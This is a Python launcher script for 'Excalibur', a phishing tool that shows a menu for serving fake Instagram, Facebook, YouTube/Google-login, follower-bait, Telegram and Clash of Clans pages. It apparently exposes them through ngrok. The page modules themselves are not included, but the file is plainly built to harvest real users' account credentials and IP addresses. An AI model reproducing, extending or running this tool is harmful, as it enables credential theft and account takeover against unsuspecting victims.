#####################################################
#### Excalibur Phishing Tool Made By FireKing255 ####
#### Copyright C 2021 by FireKing255             ####
#### Tool Version: 1.1                           ####
#####################################################



###### Modules ######
import time
import os
###### ####### ######
from colorama.ansi import clear_line
from subprocess import Popen
from colorama import Fore
from pyngrok import ngrok
from modules import Sword, Banner #For Banner
from modules import FakeInsta, Empty, ClashOfClans, FakeInstaFollowers, TeleMembers, FakeYouTube, FakeFaceBook  #For Options
from modules import Dev #For Debuging and Credits
###### ###### ######



###### Menu ######
def Menu():
    print("\t   "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"01"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"Fake Instagram    "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"02"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"Fake FaceBook     "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"03"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"Fake YouTube     ")
    print("\t   "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"04"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"Insta Follower    "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"05"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"Telegram Members  "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"06"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"Clash Of Clans   ")
    print("\t   "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"07"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"Empty (Ip Only)   "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"08"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"----------------- "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"09"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"-----------------")
    print("\t   "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"10"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"----------------- "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"11"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"----------------- "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"12"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"-----------------")
    print("\t   "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"13"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"----------------- "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"14"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"----------------- "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"15"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"-----------------")
    print("\t   "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"16"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"Credit...         "+"["+Fore.LIGHTMAGENTA_EX+"00"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"Exit...          ")
    print("\n")



    ### Input Menu ###
    MenuOption = input(Fore.LIGHTGREEN_EX+" ┌─["+Fore.LIGHTCYAN_EX+"Excalibur"+Fore.LIGHTYELLOW_EX+"~"+Fore.LIGHTMAGENTA_EX+"@HOME"+Fore.LIGHTGREEN_EX+"""]
 └──╼ """+Fore.LIGHTYELLOW_EX+"$ ")


    
    ### Checking Input ###
    try:
        MenuOption = int(MenuOption)
    except:
        exit()

    
    ### Fake Instagram ###
    if(MenuOption == 1):
        Sword.Sword()
        FakeInsta.FakeInsta()


    ### Fake FaceBook ###
    elif(MenuOption == 2):
        Sword.Sword()
        FakeFaceBook.FakeFaceBook()


    ### Fake YouTube(Goole Login) ###
    elif(MenuOption == 3):
        Sword.Sword()
        FakeYouTube.FakeYouTube()


    ### Fake Instagram Followers ###
    elif(MenuOption == 4):
        Sword.Sword()
        FakeInstaFollowers.FakeInstaFollowers()


    ### Telegram Members ###
    elif(MenuOption == 5):
        Sword.Sword()
        TeleMembers.TeleMembers()


    ### Clash Of Clans Hacker ###
    elif(MenuOption == 6):
        Sword.Sword()
        ClashOfClans.ClashOfClans()


    ### Just A Empty Page(IP Only) ###
    elif(MenuOption == 7):
        Sword.Sword()
        Empty.Empty()


    ### Credits ###
    elif(MenuOption == 16):
        Dev.Credit()
        Menu();


    ### Exit ###
    else:
        exit()



###### starting ######
Dev.Debug()
time.sleep(0.5)
os.system('killall -9 php')
os.system('clear')
Banner.Banner()
Menu();
###### ######## ######